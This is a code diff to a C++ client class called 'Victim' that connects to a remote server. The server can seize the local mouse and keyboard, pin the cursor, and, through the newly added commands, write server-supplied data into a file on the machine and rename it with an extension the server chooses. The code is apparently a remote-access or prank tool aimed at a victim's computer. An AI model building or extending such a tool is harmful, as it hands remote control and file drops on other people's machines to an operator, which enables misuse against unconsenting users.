@@ -37,7 +37,7 @@ int Victim::controlVictim()
         //if the packet is invalid reconnect with the server
         if (p.getDataSize() == 0) {
             std::cout << "DISCONNECTED FROM SERVER\n";
-            isConnected = false, controlMouse = false, controlKeybord = false;
+            isConnected = false, controlMouse = false, controlKeyboard = false;
             for (int i = 0; i < 255; i++) {
                 if (!keysStates[i])
                     continue;
@@ -81,7 +81,7 @@ int Victim::controlVictim()
             //if its a mouse key, treat it accordingly
             if ((vkc == 0x01 || vkc == 0x02 || vkc == 0x04 || vkc == 0x05 || vkc == 0x06) && controlMouse)
                 Mlib::Mouse::setState(Mlib::Mouse::Button(vkc), state);
-            else if (controlKeybord)
+            else if (controlKeyboard)
                 Mlib::Keyboard::setState(Mlib::Keyboard::Key(vkc), state);
         }
         //mouse moved
@@ -110,9 +110,9 @@ int Victim::controlVictim()
             }
 
             if (cmd == 'a')
-                controlKeybord = true;
+                controlKeyboard = true;
             else
-                controlKeybord = false;
+                controlKeyboard = false;
         }
         //start/stop controlling keyboard
         else if (cmd == 's' || cmd == 'x') {
@@ -136,7 +136,7 @@ int Victim::controlVictim()
             file.write(name.c_str(), name.size());
             file.close();
         }
-        //apparently victim isnt initialized
+        //apparently victim isn't initialized
         else if (cmd == '?') {
             for (int i = 0; i < 255; i++) {
                 if (!keysStates[i])
@@ -151,8 +151,85 @@ int Victim::controlVictim()
             }
 
             //connect and initialize again
-            isConnected = false, controlMouse = false, controlKeybord = false;
+            isConnected = false, controlMouse = false, controlKeyboard = false;
             connectServer();
+        }
+        //create new file
+        else if (cmd == 'f') {
+            if (file != nullptr) {
+                file->close();
+                delete file;
+                file = nullptr;
+
+                p.clear();
+                p << sf::Uint8('h');
+                sendServer(p);
+
+                continue;
+            }
+
+            std::thread newFile(&Victim::createNewFile, this);
+            newFile.detach();
+        }
+        //write file
+        else if (cmd == 'o') {
+            if (file == nullptr)
+                continue;
+            else if (!file->is_open()) {
+                file->close();
+                delete file;
+
+                p.clear();
+                p << sf::Uint8('h');
+                sendServer(p);
+
+                continue;
+            }
+
+            const void* buffer = p.getData();
+            auto data = static_cast<const char*>(buffer);
+            ++data;
+            size_t size = p.getDataSize() - 1;
+            file->write(data, size);
+
+            p.clear();
+            p << sf::Uint8('y');
+            sendServer(p);
+        }
+        //close file
+        else if (cmd == 'i') {
+            if (file == nullptr)
+                continue;
+            else if (!file->is_open()) {
+                file->close();
+                delete file;
+                file = nullptr;
+
+                p.clear();
+                p << sf::Uint8('h');
+                sendServer(p);
+
+                continue;
+            }
+
+            std::string ext;
+            p >> ext;
+
+            file->close();
+            delete file;
+            file = nullptr;
+
+            std::string newName = filePath + ext;
+            std::rename(filePath.c_str(), newName.c_str());
+        }
+        //file fail
+        else if (cmd == 'h') {
+            if (file == nullptr)
+                continue;
+
+            file->close();
+            delete file;
+            file = nullptr;
         }
     }
 
@@ -166,7 +243,7 @@ void Victim::keepAwake()
         if (isConnected && Mlib::currentTime().asMil() - lastAwakeSignal > 2'000) {
             sf::Packet p;
             p << sf::Uint8('r');
-            server.send(p);
+            sendServer(p);
             lastAwakeSignal = Mlib::currentTime().asMil();
         }
         //sleep to save computing power
@@ -185,7 +262,7 @@ init:
     sf::Packet p;
     p << sf::Uint8('v') << name;
     //tell server the role and the name
-    if (server.send(p) == sf::Socket::Disconnected)
+    if (sendServer(p) == sf::Socket::Disconnected)
         goto connect;
 
     p.clear();
@@ -205,6 +282,26 @@ init:
     pinMouse.detach();
 }
 
+void Victim::createNewFile()
+{
+    filePath = Mlib::getSaveFilePath("All Files (*.*)\0*.*\0");
+
+    if (filePath == "") {
+        sf::Packet p;
+        p << sf::Uint8('h');
+        sendServer(p);
+        return;
+    }
+
+    filePath = filePath.substr(0, filePath.find_first_of('.'));
+
+    file = new std::ofstream(filePath, std::ios::binary | std::ios::out);
+
+    sf::Packet p;
+    p << sf::Uint8('y');
+    sendServer(p);
+}
+
 void Victim::pinMouse()
 {
     while (true) {
@@ -212,4 +309,12 @@ void Victim::pinMouse()
             Mlib::Mouse::setPos(mousePos);
         Mlib::sleep(Mlib::milliseconds(1));
     }
+}
+
+sf::Socket::Status Victim::sendServer(sf::Packet& p)
+{
+    mutex.lock();
+    auto state = server.send(p);
+    mutex.unlock();
+    return state;
 }
